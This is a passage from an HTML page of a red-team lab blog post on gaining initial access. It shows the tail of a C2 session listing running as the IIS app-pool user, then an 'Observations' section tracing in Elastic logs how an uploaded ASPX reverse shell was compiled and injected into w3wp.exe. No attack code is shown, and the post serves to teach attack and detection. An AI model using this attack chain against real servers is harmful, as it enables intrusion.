https://192.168.24.138</span><br><span class="line">    Remote Address: tcp([::1]:35566)-&gt;192.168.24.22</span><br><span class="line">         Proxy URL: </span><br><span class="line">Reconnect Interval: 1m0s</span><br><span class="line">     First Contact: Mon Feb 13 09:31:57 EST 2023 (1m29s ago)</span><br><span class="line">      Last Checkin: Mon Feb 13 09:33:14 EST 2023 (12s ago)</span><br></pre></td></tr></table></figure>


</li>
<li><p>As shown in the snippet above, we are running as <code>IIS APPPOOL\DefaultAppPool</code>.</p>
</li>
<li><p>In the next post we will try to escalate our privilege to a higher user on the system.</p>
</li>
</ol>
<h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><p>By checking the target logs, we are actually expecting something that refers to the file eupload and compilation of our .Net reverse shell.</p>
<p>I’m using Elastic stack for logs inspection.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230223172811109.png" class="">


<p>The main actions of interest are “File Created” and “Process Create”, these refers to the file upload, file compilation, result save.</p>
<p>The process tree indicates that the IIS proces <code>w3wp.exe</code> is the root for these actions, it fired <code>csc.exe</code> to compile the uploaded ASPX file, and <code>csc.exe</code> in turn calls <code>VBCSCompiler.exe</code> to accomplish that.</p>
<p>It is worth mentioning that we are injecting into the same process <code>w3wp.exe</code>, so there are no other process created, but we may have to migrate to a more stable process other than this one.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/image-20230223174155794.png" class="">

	  <div class="article-footer-copyright">

</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="https://mmnoureldin.github.io/Red-Team/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-02-13 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/">red team<span>6</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/intial-access/">intial access<span>1</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="https://mmnoureldin.github.io/Red-Team/tags/Sliver/">Sliver<span>3</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/file-upload/">file upload<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/aspx/">aspx<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/windows-defender/">windows defender<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/AV/">AV<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1190/">T1190<span>1</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1055/">T1055<span>3</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Introduction"><span class="toc-article-text">Introduction</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Diagram"><span class="toc-article-text">Diagram</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Players"><span class="toc-article-text">Players</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Setup-firewall-rules"><span class="toc-article-text">Setup firewall rules</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exploitation"><span class="toc-article-text">Exploitation</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Scanning"><span class="toc-article-text">Scanning</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#RCE-through-file-upload"><span class="toc-article-text">RCE through file upload</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Observations"><span class="toc-article-text">Observations</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 Mostafa Noureldin's Blog
  
       
</p>
 </footer>
</div> <!-- container-narrow -->
  
  <script type="text/javascript">
  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

  _st('install', 'ZP2ZSuHgipSZfRyU8uTR','2.0.0');
  </script>



  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="https://mmnoureldin.github.io/Red-Team/js/jquery.imagesloaded.min.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/gallery.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/bootstrap.min.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/main.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/search.js"></script> 




   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "https://mmnoureldin.github.io/Red-Team/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
